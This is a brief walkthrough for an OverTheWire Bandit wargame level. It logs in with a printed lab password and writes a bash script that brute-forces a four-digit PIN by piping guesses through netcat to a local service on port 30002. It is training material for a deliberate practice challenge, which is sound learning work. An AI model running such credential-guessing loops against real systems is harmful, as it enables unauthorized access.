# level24 -> level25


[http://http://overthewire.org/wargames/bandit/bandit25.html](http://http://overthewire.org/wargames/bandit/bandit25.html)

-

    ssh bandit24@bandit.labs.overthewire.org

-

    bandit24@bandit.labs.overthewire.org's password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ


-

    bandit24@melinda:~$ cd /tmp/

-

    bandit24@melinda:/tmp$ mkdir sliitwar24

-

    bandit24@melinda:/tmp$ cd sliitwar24

-

    bandit24@melinda:/tmp/sliitwar24$ nano bruteforce.sh

-

    #!/bin/bash
    PASS24="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
    for i in `seq 0 10000`;
    do
    echo "Handling $i"
    printf "$PASS24 %04d\n" $i |  nc localhost 30002
    
    done

`Ctrl+X` to exit press `Y` to save

-

    bandit24@melinda:/tmp/sliitwar24$ chmod 777 bruteforce.sh

-


   

    